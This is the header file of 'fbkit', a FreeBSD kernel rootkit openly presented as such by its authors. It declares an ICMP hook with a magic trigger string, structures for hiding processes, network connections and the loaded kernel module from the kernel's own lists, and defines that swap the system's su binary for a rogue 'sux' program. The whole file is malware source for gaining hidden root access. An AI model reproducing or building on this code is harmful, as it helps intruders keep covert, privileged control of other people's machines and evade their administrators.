/*******************************************************************************
*                ____                     _ __                                 *
*     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           *
*    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           *
*   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            *
*                                            /___/ team                        *
*                                                                              *
* fbkit                                                                        *
* A FreeBSD rootkit for the 1337 h4x0rs out there.                             *
*                                                                              *
* FILE                                                                         *
* fbkit.h                                                                      *
*                                                                              *
* NOTES                                                                        *
* pr1v4te m4t3ri4l - d0n't publ1sh 0r 1 w1ll pwn y0u!                          *
*                                                                              *
* AUTHOR                                                                       *
* noptrix@nullsecurity.net                                                     *
*                                                                              *
*******************************************************************************/

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysent.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/syscallsubr.h>
#include <sys/socket.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <sys/rwlock.h>

#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/_sx.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>


#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#define RKIT_NAME   "fbkit.ko"
#define TRIGGER     "opensesame"
#define T_SIZE      161

#define TOFUCK      "/usr/bin/su"
#define EVIL        "/usr/bin/sux"
#define N_EVIL      "sux"


/* icmp hook */
extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

/* proccess hiding */
struct ps_hiding_args {
    char *p_comm;
};

/* connection hiding */
struct conn_hiding_args {
    u_int16_t fport;
};

/* LKM hiding */
extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;

struct module {
    TAILQ_ENTRY(module) link;
    TAILQ_ENTRY(module) flink;
    struct linker_file  *file;
    int                 refs;
    int                 id;
    char                *name;
    modeventhand_t      handler;
    void                *arg;
    modspecific_t       data;
};

/* EOF */
